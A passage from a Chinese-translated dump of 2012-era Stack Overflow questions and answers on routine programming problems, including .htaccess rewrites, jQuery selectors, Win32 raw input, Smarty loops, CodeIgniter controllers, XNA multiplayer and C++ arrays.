我想关键是你可以用这种模式包装几乎任何集合，以满足几乎任何需要。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-05-20T18:36:51.673

正如人们所说，索引属性是一种选择。教程在这里

[http://msdn.microsoft.com/en-us/library/aa288464(v=vs.71).aspx](http://msdn.microsoft.com/en-us/library/aa288464(v=vs.71).aspx)

# .htaccess - 我的 htaccess 子域重写有什么问题？

> ID：10676045
> 
> 赞同：1
> 
> 时间：2012-05-20T18:32:05.413
> 
> 标签：.htaccess

我想将 www.domain.com/s/index.php?s=test 重写为 test.domain.com

我使用以下方法在本地主机中成功完成了它。

```
RewriteCond %{HTTP_HOST} ^([^\.]+)\.localhost$ [NC]
RewriteRule ^$ /s/index.php?s=%1 [L] 
```

但是，当我把它放在我的服务器上时，它没有工作。下面是代码

```
RewriteCond %{HTTP_HOST} ^([^\.]+)\.domain\.com$ [NC]
RewriteRule ^$ /s/index.php?s=%1 [L] 
```

什么地方出了错？欣赏建议。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-20T19:34:33.090

经过深入研究，我发布的上述htaccess代码没有错误。发生错误是因为存在冲突的语句。

# javascript - jquery 访问所有具有 id 属性的元素

> ID：10676049
> 
> 赞同：3
> 
> 时间：2012-05-20T18:32:36.580
> 
> 标签：javascript, jquery

我想从 div 中获取所有元素，这`id attribute`意味着我想做类似的事情：

```
$("div").find("*[id]").each(function() { alert(this.id) }); 
```

但这不起作用，有人可以帮我吗？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-05-20T18:34:06.060

[您的代码工作](http://jsfiddle.net/J4Fgf/1/)得很好，但您可以`*`从选择器中删除。

其他有效选项：

```
$("div").find("[id]").each(function() { alert(this.id) }); 
```

[**现场演示**](http://jsfiddle.net/J4Fgf/3/)

或这个：

```
$("div *").filter("[id]").each(function() { alert(this.id) }); 
```

[**现场演示**](http://jsfiddle.net/J4Fgf/)

或这个：

```
$("div [id]").each(function() { alert(this.id) }); // which I think is the best 
```

[**现场演示**](http://jsfiddle.net/J4Fgf/2/)

# python - bash：意外标记“（”附近的语法错误 - Python

> ID：10676050
> 
> 赞同：26
> 
> 时间：2012-05-20T18:32:38.790
> 
> 标签：python, syntax

```
# from lxml import etree; 
import module2dbk; 
print module2dbk.xsl_transform(etree.parse('test-ccap/col10614/index.cnxml'), []);

Error: bash: syntax error near unexpected token `(' 
```

* * *

## 回答 #1

> 赞同：68
> 
> 时间：2012-05-20T18:34:48.157

`#!/usr/bin/env python`在脚本顶部添加，或使用调用脚本`python myscript.py`

* * *

## 回答 #2

> 赞同：24
> 
> 时间：2012-05-20T18:35:06.947

你是在unix命令提示符下输入这个吗？您应该在 python 环境中执行此操作，即。`python`在提示符下输入并从那里开始工作。

此外，`;`在 Python 的行尾不需要

* * *

## 回答 #3

> 赞同：14
> 
> 时间：2015-01-13T07:14:09.303

添加

```
#!/usr/bin/env python 
```

或者但我更喜欢使用上面的那个。

`#!/usr/bin/python`

如果你已经安装了 python 2 和 python 3 并且 python 2 是默认的，你可以使用这些命令运行 python 3

```
#!/usr/bin/env python3 
```

在文件顶部

或者这样跑

```
python code.py 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2018-11-14T19:15:32.187

好吧，我遇到了完全相同的问题。我已经尝试了一切，但没有任何效果。我的程序在 Windows 命令提示符和我的 iPhone Python 应用程序解释器上完美运行，但在我的 Macbook 终端上却没有，每当我尝试运行该程序时，我总是遇到以下错误：

> bash：意外标记'（'附近的语法错误

最后，来自用户*Tripleee*的评论帮助我想出了一个解决方案；尽管他`!/usr/bin/python`在我的代码开头添加的解决方案并没有为我做到这一点，但它帮助我理解了他写道：

> 错误消息表明脚本由 bash 而不是 python 执行。

然后我注意到我的 code(extra).py 包含 '(' 撇号，我重命名为我的 codeextra.py 就是这样，问题解决了。:)

# c - 关于 WM_INPUT 和 GetPixel 的问题

> ID：10676054
> 
> 赞同：1
> 
> 时间：2012-05-20T18:33:02.957
> 
> 标签：c, winapi, gdi

我不知道我应该使用什么标题，但请阅读此内容。

我正在制作一个在鼠标指针位置显示颜色的程序。我想使用 WM_INPUT 因为 WM_MOUSEMOVE 更新不够快。

这是我的一些主要代码。

```
#include <Windows.h>
#include <WindowsX.h>

/* void Cls_OnInput(HWND hWnd, UINT inputCode, HRAWINPUT hRawInput) */
#define HANDLE_WM_INPUT(hWnd, wParam, lParam, fn) \
  ((fn)((hWnd), GET_RAWINPUT_CODE_WPARAM(wParam), (HRAWINPUT)(lParam)), 0L)

static LPCTSTR main_window_class_name = TEXT("MainWindow");
static HDC hdc_screen;
static COLORREF color;

LRESULT CALLBACK MainWindowProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
BOOL MainWindow_OnCreate(HWND hWnd, LPCREATESTRUCT lpCreateStruct);
void MainWindow_OnDestroy(HWND hWnd);
void MainWindow_OnPaint(HWND hWnd);
void MainWindow_OnInput(HWND hWnd, UINT inputCode, HRAWINPUT hRawInput);

ATOM RegisterMainWindowClass(HINSTANCE hInstance)
{
  WNDCLASSEX wcex;

  wcex.cbSize = sizeof(wcex);
  wcex.style = 0;
  wcex.lpfnWndProc = MainWindowProc;
  wcex.cbClsExtra = 0;
  wcex.cbWndExtra = 0;
  wcex.hInstance = hInstance;
  wcex.hIcon = (HICON)LoadImage(NULL, IDI_APPLICATION, IMAGE_ICON, 0, 0, LR_SHARED);
  wcex.hCursor = (HCURSOR)LoadImage(NULL, IDC_ARROW, IMAGE_CURSOR, 0, 0, LR_SHARED);
  wcex.hbrBackground = GetSysColorBrush(COLOR_BTNFACE);
  wcex.lpszMenuName = NULL;
  wcex.lpszClassName = main_window_class_name;
  wcex.hIconSm = wcex.hIcon;

  return RegisterClassEx(&wcex);
}

HWND CreateMainWindow(HINSTANCE hInstance)
{
  return CreateWindow(main_window_class_name, TEXT("WhatColor"), WS_CAPTION | WS_SYSMENU, CW_USEDEFAULT, CW_USEDEFAULT, 640, 480, HWND_DESKTOP, NULL, hInstance, NULL);
}

LRESULT CALLBACK MainWindowProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
  switch (uMsg)
  {
    HANDLE_MSG(hWnd, WM_CREATE, MainWindow_OnCreate);
    HANDLE_MSG(hWnd, WM_DESTROY, MainWindow_OnDestroy);
    HANDLE_MSG(hWnd, WM_PAINT, MainWindow_OnPaint);
    HANDLE_MSG(hWnd, WM_INPUT, MainWindow_OnInput);
  default:
    return DefWindowProc(hWnd, uMsg, wParam, lParam);
  }
}

BOOL MainWindow_OnCreate(HWND hWnd, LPCREATESTRUCT lpCreateStruct)
{
  RAWINPUTDEVICE rid[1];

  UNREFERENCED_PARAMETER(lpCreateStruct);

  rid[0].usUsagePage = 1;
  rid[0].usUsage = 2;
  rid[0].dwFlags = 0;
  rid[0].hwndTarget = hWnd;
  RegisterRawInputDevices(rid, 1, sizeof(rid[0]));

  hdc_screen = CreateDC(TEXT("DISPLAY"), NULL, NULL, NULL);

  return TRUE;
}

void MainWindow_OnDestroy(HWND hWnd)
{
  UNREFERENCED_PARAMETER(hWnd);

  DeleteDC(hdc_screen);
  PostQuitMessage(EXIT_SUCCESS);
}

void MainWindow_OnPaint(HWND hWnd)
{
  static PAINTSTRUCT ps;

  BeginPaint(hWnd, &ps);
  EndPaint(hWnd, &ps);
}

void MainWindow_OnInput(HWND hWnd, UINT inputCode, HRAWINPUT hRawInput)
{
  static RAWINPUT raw_input;
  static UINT raw_input_size = sizeof(raw_input);
  static POINT point;

  UNREFERENCED_PARAMETER(inputCode);

  GetRawInputData(hRawInput, RID_HEADER, &raw_input, &raw_input_size, sizeof(raw_input.header));

  if (raw_input.header.dwType == RIM_TYPEMOUSE)
  {
    GetCursorPos(&point);
    color = GetPixel(hdc_screen, point.x, point.y);
    DeleteBrush(SetClassLong(hWnd, GCL_HBRBACKGROUND, (LONG)CreateSolidBrush(color)));
    InvalidateRect(hWnd, NULL, TRUE);
  }
} 
```

问题是程序似乎一次又一次地处理 WM_INPUT 消息，并且主窗口卡住了。如果我删除

```
color = GetPixel(hdc_screen, point.x, point.y); 
```

窗口是正常的，但我无法得到我想要的颜色。

我认为如果您尝试测试我的代码会更好。

我应该怎么做才能解决这个问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-23T07:04:14.667

我将改用 Timer 并处理`WM_TIMER`消息。

# php - Smarty / PHP 在 print_r 检查 PHP 结果后显示在数组中。但在 Smarty 中只显示第一个字母，在 foreach 循环中

> ID：10676055
> 
> 赞同：0
> 
> 时间：2012-05-20T18:33:12.457
> 
> 标签：php, smarty

我正在 Smarty 中显示 Mysql 数据库的结果。我为 Smarty 分配了一个数组（在我使用 print_r 在 PHP 中测试这个数组之前），但是在 Smarty 中执行 foreach 循环之后，只显示一个字母。

我的 while / foreach 循环可能有问题吗？我在它之外做了分配给Smarty...

谢谢和问候埃里克

我的 PHP 脚本：

```
 $query_main_category = "
        SELECT 
            webshop_products.wpID
            ,webshop_products.wpName
            ,webshop_products.wpDescription
            ,webshop_categories.wcName
        FROM
            webshop_products
        INNER JOIN
            webshop_product_category
        ON 
            webshop_products.wpID = webshop_product_category.wpcID
        INNER JOIN
            webshop_categories
        ON 
            webshop_product_category.wcID = webshop_categories.wcID  
        WHERE 
            webshop_categories.wcID = '1'
        ";
        $exec_main_category = mysql_query($query_main_category);
        if (($exec_main_category) and mysql_num_rows($exec_main_category))
        {
            while($list_products_category = mysql_fetch_assoc($exec_main_category))
            {
                $entries_product[] = $list_products_category; 
            }   
        }   

        $view_description = '';
        foreach($entries_product as $entry_product)
        {
            //If the description is more than 200 characters
            if (strlen($entry_product['wpDescription']) > 200) 
            {
                //Take the first 200 characters...
                $entry_product['wpDescription'] = substr($entry_product['wpDescription'], 0, 200);

                //Look for the last space in the description
                $temp = strrpos($entry_product['wpDescription'], ' ');

                //And cut everything after that point, and add three dots to show there's more
                $entry_product['wpDescription'] = substr($entry_product['wpDescription'], 0, $temp) . '...';
            }
            else
            {
                //If the description is <= 200 chars, show the whole description
                $entry_product['wpDescription'] = $entry_product['wpDescription'];
            }
        }
$this->view->assign('entry_product_smarty',$entry_product); 
```

和聪明的：

```
<table>
    <tr>
        <td><strong>Titel</strong></td>     
        <td><strong>Omschrijving</strong></td>
    </tr>
    {foreach from=$entry_product_smarty item=entry_product}         
    <tr>
        <td>{$entry_product.wpName}</td>
        <td>{$entry_product.wpDescription}</td>
    </tr>
    {/foreach}

</table> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-21T04:49:49.607

您分配 $entry_product 而不是 $entries_product。此外，您可能希望像下面的代码一样更改您的 foreach 循环，否则它不会有任何效果：

```
 foreach($entries_product as $key => $entry_product)
        {
            //If the description is more than 200 characters
            if (strlen($entry_product['wpDescription']) > 200) 
            {
                //Take the first 200 characters...
                $entries_product[$key]['wpDescription'] = substr($entry_product['wpDescription'], 0, 200);

                //Look for the last space in the description
                $temp = strrpos($entry_product['wpDescription'], ' ');

                //And cut everything after that point, and add three dots to show there's more
                $entries_product[$key]['wpDescription'] = substr($entry_product['wpDescription'], 0, $temp) . '...';
            }
            else
            {
                //If the description is <= 200 chars, show the whole description
                $entries_product[$key]['wpDescription'] = $entry_product['wpDescription'];
            }
        }
        $this->view->assign('entry_product_smarty',$entries_product); 
```

# javascript - HTML5 中的 2D 交互式动画引擎

> ID：10676057
> 
> 赞同：1
> 
> 时间：2012-05-20T18:33:38.453
> 
> 标签：javascript, html, canvas, svg

我正在寻找一个简单的 JavaScript 库或框架来在浏览器中创建交互式 2D 动画。（请原谅标题中的流行语，但我没有设置任何特定的渲染技术，如 Canvas 或 SVG。）

~~这应该使得在画布~~屏幕上绘制和动画任意（虽然不是很复杂）形状变得简单，*并*允许用户选择和移动这些形状作为对象（有点像一个*非常*基本的[RTS](http://en.wikipedia.org/wiki/Real-time_strategy)游戏引擎）。

理想情况下，应该支持以下功能（直接或间接；如有必要，我会自己实现）：

*   平移
*   缩放
*   [鱼眼](http://bost.ocks.org/mike/fisheye/)局部放大
*   框选择（通过在它们周围绘制一个框来选择多个对象）

还不熟悉这些东西，我发现研究那里的东西很棘手（例如关于搜索词）。此外，我对一些不需要我付出任何努力的神奇包没有任何幻想——事实上，我更喜欢简单易读的库，这样我就可以通过阅读源代码来了解基础知识。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-20T18:53:22.470

如果你喜欢简单的库，不妨看看[GameJS](http://gamejs.org/)。它声称是“HTML5 画布元素之上的精简库”。它是 PyGame 到 JavaScript 的一个端口，根据我的经验，它*是*一个相当不错的抽象层，同时又不会过度使用它。

如果这还不能解决问题，请查看这个[JS 游戏（和动画）引擎列表](https://github.com/bebraw/jswiki/wiki/Game-Engines)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-20T19:22:22.113

您可能确实进行了搜索，发现了几十个 js 游戏引擎。我只会为你缩小范围。仅仅吐出一个单一的js游戏引擎是不可能的。此外，根据您想要制作的游戏类型，您可能会发现一些比其他更合适。所以他们在这里

[石灰JS](http://www.limejs.com/)

[影响](http://impactjs.com/)

[狡猾](http://craftyjs.com/)

# scala - with 子句中抽象特征的实现

> ID：10676061
> 
> 赞同：1
> 
> 时间：2012-05-20T18:34:03.993
> 
> 标签：scala, traits, scala-2.9

> **可能重复：**
> [在 Scala 中，我如何建议自己的方法？](https://stackoverflow.com/questions/7863947/in-scala-how-can-i-advise-my-own-methods)

认为：

```
trait SomeAbstractTrait {
    val transform : Int => Int
} 
```

为什么以下工作：

```
new SomeClass() with SomeTrait with SomeAbstractTrait {
   val transform : Int => Int = (x) => x*2
} 
```

尽管

```
new SomeClass() with SomeAbstractTrait {
   val transform : Int => Int = (x) => x*2
} with SomeTrait 
```

才不是？

在使用之前必须使用单个抽象函数对象声明特征有点烦人，而且由于第一个版本有效，我假设我只是语法错误？

# ruby-on-rails - 在 ajax 发布后更新 rails button_to 的最简单方法是什么？

> ID：10676063
> 
> 赞同：0
> 
> 时间：2012-05-20T18:34:14.587
> 
> 标签：ruby-on-rails, ruby-on-rails-3, jquery, ujs

我有两个 button_to 调用来播放视频。该按钮在我的视频控制器中调用一个特色动作。

在我的控制器中

```
def featured
 video = Video.find(params[:id]) 
 video.nfeatured = params[:nfeatured]
 video.save
respond_to do |format|
  format.html { redirect_to :back }
  format.js
 end
end 
```

在我看来

```
<td class="featured">
<% if video.nfeatured == false %>
<%= button_to 'Feature', featured_network_video_path(network, video, 
:nfeatured => true), :remote => true, :class => :feature %>

 <% else %>
 <%= button_to 'Remove', featured_network_video_path(network, video,
 :nfeatured => false), :remote => true, :class => :unfeature  %>
<% end %>
</td> 
```

在成功的 ajax 发布后将按钮更改为“删除”的最不显眼的方法是什么？其他一切工作正常。我尝试在 features.js.erb 文件中进行 jQuery 切换调用，但它不起作用。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-20T18:50:17.813

我喜欢这样做：

```
<td class="featured">
<%= render :template => "videos/featured" %>
</td> 
```

精选.html.erb：

```
<% if @video.nfeatured == false %>
  <%= button_to 'Feature', featured_network_video_path(@network, @video, 
  :nfeatured => true), :remote => true, :class => :feature %>

<% else %>
  <%= button_to 'Remove', featured_network_video_path(@network, @video,
  :nfeatured => false), :remote => true, :class => :unfeature  %>
<% end %> 
```

精选.js.erb

```
$(".featured").html("<%= j(render :template => "videos/featured", :handlers => [:erb]) %>"); 
```

是的，我认为这不是最好的方法。我希望看到更正确的解决方案。

编辑：对于循环，此解决方案不适合。第二个版本：

```
<% unless video.nfeatured %>
  <%= button_to 'Feature', featured_network_video_path(network, video, 
  :nfeatured => true), :remote => true, :class => :feature %>
  <%= button_to 'Remove', featured_network_video_path(network, video,
  :nfeatured => false), :remote => true, :class => 'unfeature hidden'  %>
<% else %>
  <%= button_to 'Feature', featured_network_video_path(network, video, 
  :nfeatured => true), :remote => true, :class => 'feature hidden' %>
  <%= button_to 'Remove', featured_network_video_path(network, video,
  :nfeatured => false), :remote => true, :class => :unfeature  %>
<% end %> 
```

在一些咖啡文件中：

```
$('.featured').bind "ajax:success", ->
  $(this).toggle()
  $(this).closest('a').toggle() 
```

我不确定这段代码（它显然需要重构），但我希望你能明白。

# c# - 如何在 C# 中获取 PDF 文档的当前页码

> ID：10676067
> 
> 赞同：1
> 
> 时间：2012-05-20T18:34:37.603
> 
> 标签：c#, pdf

我打开一个PDF文件是这样的：...

```
using System. Diagnostics; 
public Form1() 
        { 
            InitializeComponent(); 
            axAcroPDF1.LoadFile(@"D:\myBook.pdf"); 
            axAcroPDF1.Show(); 
        } 
```

但是当我转到另一个页面并想查看它的编号时，我找不到方法 Get 或类似的东西。如何读取当前打开的页数？？？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-07-02T11:24:31.483

如何获取页码：

```
Dim pdfPage As Acrobat.CAcroPDPage
Set pdfPage = pdfPageView.GetPage
lPage = pdfPage.GetNumber 
```

# php - php内部类支持

> ID：10676073
> 
> 赞同：8
> 
> 时间：2012-05-20T18:35:17.550
> 
> 标签：php

PHP 5.3 或更高版本是否支持内部类？例子：

```
class MyClass{
    class PrivateClass1{

    }
    class PrivateClass2{

    }
    class PrivateClass3{

    }

    private $obj1;
    private $obj2;
    private $obj3;

    __construct(){
        $obj1 = new PrivateClass1();
        $obj2 = new PrivateClass2();
        $obj3 = new PrivateClass3();
    }
} 
```

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-05-20T18:54:07.490

PHP 当前 (5.4.3) 不支持内部/朋友类

wiki中也没有[RFC](https://wiki.php.net/rfc)要求添加这样的功能。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-20T18:45:01.560

可以在另一个类定义中创建一个类，但不可能在一个类定义中定义一个类。所以这意味着你的构造无效。

但是，您始终可以使用另一个类扩展一个类，请查看此 URL 了解更多信息：

[http://php.net/manual/en/keyword.extends.php](http://php.net/manual/en/keyword.extends.php)

检查[我可以在另一个类中实例化一个 PHP 类吗？](https://stackoverflow.com/questions/1583140/is-it-allowed-to-create-a-php-class-inside-another-class)更多。

# php - 从父类创建过滤器？

> ID：10676078
> 
> 赞同：0
> 
> 时间：2012-05-20T18:36:32.720
> 
> 标签：php, codeigniter

我正在使用 CodeIgniter，我想创建某种过滤器来了解用户何时可以/不可以访问当前控制器

如果有人知道如何以不同的方式实现这一点，那很好，但我的想法（并试图做的）如下：

CI_Controller - 这是基本的 CodeIgniter 控制器类

MY_Controller - 我使用的扩展 CI_Controller 的基本控制器

[控制器] - 任何“物理”控制器

我试图做的是：

MY_Controller.php

```
class MY_Controller extends CI_Controller{

    private static $namespace = null;

    private static $permission = array('site', 'settings');

    public function __construct(){
        if ((!isset($_SESSION['user'])) && (in_array(__CLASS__, $permission))){
            throw new Exception('Unauthorized');
        }
        parent::__construct();
    }

} 
```

显然，这不起作用，因为**CLASS**始终是 MY_Controller 的，而不是子对象的……而且**NAMESPACE**也不起作用。

有人有什么想法吗？因为我真的很讨厌开始把这段代码放在其他所有的类中，我稍后会需要过滤来做一些更复杂的事情......

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-20T20:05:29.910

由于到目前为止还没有答案，也许这个建议可能会有所帮助。不过，这是一种不同的方法，它使用模块化扩展 - HMVC ...

像这样，您可以拥有一个带有控制器的“登录”模块，该控制器包含一些方法来登录用户、检查会话状态和注销用户（等等）。

在每个其他模块中，您现在可以加载模块登录名并检查状态并在需要时重定向...

有一个教程[HMVC: an Introduction and Application](http://net.tutsplus.com/tutorials/php/hvmc-an-introduction-and-application/) I follow on nettuts 展示了如何[从头开始编写 CodeIgniter：第 6 天 – 以这种方式登录](http://net.tutsplus.com/articles/news/codeigniter-from-scratch-day-6-login/)。也许这有帮助。我遇到了一些困难，因为它使用的是旧的 codeigniter 版本。所以也许[这个线程](https://stackoverflow.com/questions/10462377/module-load-breaks-view-load-old-code)有帮助。

这不是您尝试做事的方式，但也许会有所帮助！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-20T21:09:23.847

我没有尝试过，但我在[这个](http://codeigniter.com/forums/viewthread/74784/#584038)论坛上看到的内容可能对你有用。预测代码为：

```
class MY_Controller extends Controller{
    private static $permission = array('site', 'settings');
    public function __construct(){
        if ((!isset($_SESSION['user'])) && (in_array(__CLASS__, $permission))){
            throw new Exception('Unauthorized');
        }
        parent::Controller();
    }
} 
```

但是你需要使用

```
class My_controller extends MY_Controller 
```

代替

```
class My_controller extends Controller 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-30T13:44:37.460

我通过以下方式解决了它......只是在构造函数中，我定义了当前类

```
class MY_Controller extends CI_Controller{
    private static $permission = array('site', 'settings');
    public function __construct($currentController = __CLASS__){
        if ((!isset($_SESSION['user'])) && (in_array($currentController , $permission))){
            throw new Exception('Unauthorized');
        }
        parent::Controller();
    }
} 
```

在调用物理控制器的时候，我们简单的写成如下

```
class PhysicalController extends MY_Controller{

  public function __construct(){
    parent::__construct(__CLASS__);
  }

} 
```

# python - 为什么python AST模块将源代码解析为它的节点树没有父点

> ID：10676079
> 
> 赞同：0
> 
> 时间：2012-05-20T18:36:36.673
> 
> 标签：python, abstract-syntax-tree

我使用 AST 模块来解析源代码，并对其进行处理。但是，当我需要从其子节点返回父节点时，它并不存在。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-20T18:39:32.523

您始终可以将父节点存储在堆中以备后用。

# php - 如何自动包含？

> ID：10676082
> 
> 赞同：0
> 
> 时间：2012-05-20T18:36:57.487
> 
> 标签：php, oop

我有 autoload.php 。这是为了自动加载我的课程而运行的。我想将 autoload.php 作为自动包含在主文件夹中的所有 php 文件中。

像：

```
include_to("index.php, example.php, ............... , other.php"); 
```

同时我知道php的运行方式。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-05-20T18:38:58.280

你这样做是不对的。

相反，您应该使用[`spl_autoload_register()`](http://php.net/manual/en/function.spl-autoload-register.php)创建一个自动加载器来加载文件。如果它找不到您使用的类。

```
spl_autoload_register(function( $className ){

    $filepath = '/path/to/files/' . strtolower( $className ) . '.php';

    if ( !file_exists( $filepath ) )
    {
        $message  = "Cannot load class: $className. ";
        $message .= "File '$filepath' not found!";
        throw new Exception( $message ); 
    }

    require $filepath;

}); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-20T18:52:14.660

您可以使用[auto_prepend_file](http://www.php.net/manual/en/ini.core.php#ini.auto-prepend-file)设置将文件包含在所有脚本中。

# xna - XNA 中的本地多人游戏

> ID：10676084
> 
> 赞同：0
> 
> 时间：2012-05-20T18:37:01.657
> 
> 标签：xna, multiplayer

有没有关于如何在 XNA 游戏（Windows）中创建本地多人游戏的教程或示例？

我经常看到网络游戏的教程，但从来没有关于如何进入第二个玩家的教程。如何让第二个玩家登录，使用相同的对象但使用不同的控制器......

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-22T09:14:45.620

我没有遇到任何教程，但我可以为你概述一些基本的想法。

*如果您的所有玩家都相同：*

修改您的“玩家”对象构造函数，使其具有某些 playerIndex 的参数。检查播放器类中的输入时，请使用此索引。这样，您可以创建一堆“玩家”，而无需为每个玩家编写单独的类。然后，您可以编写通用代码，例如：

```
 if (inputManager.IsMoveRight(playerIndex))
    { 
        // do some stuff etc.
    } 
```

这将需要对您的输入管理结构进行一些修改。您的目标应该是概括您已经拥有的代码。

*如果每个玩家都有完全不同的实现：*

在这种情况下，您需要利用多态性。如果每个玩家都应该在菜单屏幕中选择他们的角色，那么您需要在玩家类中有一些属性来保存他们选择的角色*（注意：如果每个玩家都应该是预设默认值，即玩家 1 始终是马里奥，玩家 2总是音速的，最好为每个播放器子类化你的播放器类）*。如果您愿意，可以将此属性上移一层并存储在“控制器”类中。

*菜单逻辑：*

处理玩家登录最好在加载任何关卡之前完成。我将假设您不需要玩家在游戏期间加入/退出。基本大纲：

*   当游戏在角色选择屏幕（或只是主菜单）中时，检查来自所有控制器的输入。如果控制器按下“开始”，则让他们登录。例如，这可能涉及简单地将 playerIndex 添加到数组中。然后，当游戏加载时，检查数组中的活跃玩家并生成任何找到的玩家。

*   字符选择可以以非常相同的方式实现，尽管您可能需要一个特定的菜单登录屏幕。在登录屏幕期间检查来自活跃玩家的输入，并允许他们滚动并选择一个角色。将结果存储在某处（例如播放器或控制器类）。

*其他需要考虑的事项：*

*   是否从键盘和游戏手柄获得输入？如果是这种情况，将键盘默认为玩家一号可能会更容易，并且只允许从游戏手柄登录/退出。

*   我之前提到过这一点，但是您需要概括您的输入管理以防止出现意大利面条代码的主要情况。为了使任何这些工作，您不应该直接从您的播放器类中检查以前/当前的控制器状态。[MSDN 游戏状态管理](http://create.msdn.com/en-US/education/catalog/sample/game_state_management)示例值得研究，因为它使用了类似的系统。

这不是一个非常全面的指南，但希望我已经提出了一些要点供您考虑。

# emacs - 用于 emacs 的球拍 flymake 模式

> ID：10676099
> 
> 赞同：12
> 
> 时间：2012-05-20T18:39:23.820
> 
> 标签：emacs, scheme, syntax-error, racket, flymake

是否可以让 flymake-mode 意识到球拍文件中的语法（或其他）错误，例如对 erlang 或 python 所做的那样？如果重要的话，我正在使用 geiser 模式进行球拍。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-05-21T13:22:56.570

这可能很容易，因为 Racket 以标准的 line:column 格式吐出警告消息。

您甚至不需要调用编译器——只需通过`racket the-file`. 但作为一个半边注，一个更好的命令行是`racket -qf the-file`. 运行上面的代码的事情是它实际上会......运行它。更具体地说，它加载模块定义，然后调用它。使用`-f`它只会加载定义但不会调用它，因此不会执行运行时。请注意，这假定该文件是一个只有一个模块的文件，这是所有以`#lang`.

更新：我试过了，确实很容易设置。我已经在[邮件列表](http://lists.racket-lang.org/users/archive/2012-May/052262.html)上发布了这段代码：

```
(defun flymake-racket-init ()
  (let* ((temp-file (flymake-init-create-temp-buffer-copy
                     'flymake-create-temp-inplace))
         (local-file (file-relative-name
                      temp-file
                      (file-name-directory buffer-file-name))))
    (list "racket" (list "-qf" local-file))))
(push '("\\.rkt\\'" flymake-racket-init)
      flymake-allowed-file-name-masks) 
```

# c++ - C++ 构造行为

> ID：10676103
> 
> 赞同：1
> 
> 时间：2012-05-20T18:39:45.470
> 
> 标签：c++, class, initialization

```
class OSwitch {
private:
    Operator *operators[];
    //int variable; <-- unused variable

public:
    OSwitch() {}
    ~OSwitch() {}

void setOperator(int id, Operator *op) {
    operators[id] = op;
}

void execute(int id) {
    operators[id]->execute();
}

}; 
```

抽象基类 Operator 有几个子类。当多次调用 setOperator() 时，数组“忘记”最后一个元素。

例如

```
XOperator a;
YOperator b;
os.setOperator(1,a);
os.setOperator(2,b);
os.execute(1); // <- wont work 
```

但是当声明 int 变量（或 OperatorSwitch 中的任何其他变量）时，它就可以工作。我不知道这是如何工作的。

感谢您的任何提示。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-20T18:46:46.260

数组`operators`没有声明大小。要么声明数组中元素的数量，如 in `operators[10]`，要么`std::vector`改用。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-20T18:56:23.000

您的成员变量`operators`是一个未调整大小的数组，它是不完整的类型，并且不允许在类定义中使用。

您可能想要的是整数到指针的*映射：*

```
#include <map>

class OSwitch
{
private:
    std::map<int, Operator *> operators;
public:
    void setOperator(int id, Operator *op) { operators[id] = op; }
    void execute(int id) { operators[id]->execute(); }
}; 
```

请注意，调用`execute`尚未分配有效指针的 ID 将是错误的。您可以通过首先检查地图元素的存在来使其更加健壮。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-20T18:51:45.717

您需要在添加数据之前初始化数组。我建议你在这个数组中使用值，而不是指针，因为这样你就不会遇到定义谁将在`Operator*`之后删除 s 的问题（即 or 的调用者`setOperator`）`~OSwitch()`。

# jquery - jQuery Tools Tabs + History - 防止在 IE 6 和 7 中跳转

> ID：10676109
> 
> 赞同：0
> 
> 时间：2012-05-20T18:41:10.043
> 
> 标签：jquery, internet-explorer, jquery-tools

我正在使用 jQuery Tabs 插件和“历史”插件，以允许添加书签和使用浏览器后退按钮。一切都很好 - 除了在 IE 6 和 7 中。当您加载页面时，IE 会跳到锚点。

这是示例实现：[http ://coolkidz.com/sell-consign/](http://coolkidz.com/sell-consign/)

有什么想法可以让 IE 表现得很好吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-26T07:31:44.820

在 IE 6/7 中启用历史记录工具时，它会向页面添加一个隐藏的 iframe，并最初将 iframe 设置`location.hash`为`'#'`. 发生这种情况时，IE 会滚动到页面底部的 iframe（即使它是隐藏的）。

由于无法编辑 jQuery Tools 源代码，我可以想到两种解决方法：

1.  [在初始化 jQuery 工具选项卡（演示](http://jsfiddle.net/jefferyto/2Hnu8/3/)）之前添加此 JavaScript ：

    ```
    if ($.browser.msie && $.browser.version < '8') {
        $(window).one("hash", function(e, h) {
            if (h === '#') {
                $(window).scrollTop(0);
            }
        });
    } 
    ```

    初始化历史记录工具后，它会滚动到页面顶部。这种解决方法的缺点是，如果窗口不在页面顶部，IE 会停留在正确的位置，但这会迫使它滚动到顶部。

2.  添加这个 CSS（[演示](http://jsfiddle.net/jefferyto/2Hnu8/2/)）：

    ```
    iframe {
        position: absolute;
    }​ 
    ```

    IE 不会尝试滚动到`position: absolute`iframe。此解决方法的缺点是这会影响您页面上的任何其他 iframe。

我建议使用解决方法#1。

# php - 为什么 JavaScript 中的链接路径不需要前面的 / 但 PHP 中的路径包含？

> ID：10676110
> 
> 赞同：0
> 
> 时间：2012-05-20T18:41:10.870
> 
> 标签：php, javascript

听起来很挑剔，但这让我挂了大约一个小时左右。

我在 JavaScript 中设置了这样的路径

```
const JAVASCRIPT =              'host/source/ArcJB.js'; 
